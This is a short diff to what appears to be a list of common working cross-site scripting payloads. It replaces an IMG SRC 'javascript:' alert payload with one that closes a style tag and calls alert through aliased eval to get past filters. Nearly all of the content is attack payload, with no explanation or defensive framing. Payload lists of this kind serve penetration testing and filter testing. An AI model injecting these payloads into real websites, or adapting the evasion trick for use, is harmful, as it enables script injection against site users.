@@ -1,3 +1,3 @@
 # xss-common-working-payloads
 
-<IMG SRC="javascript:alert('XSS');">
+</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
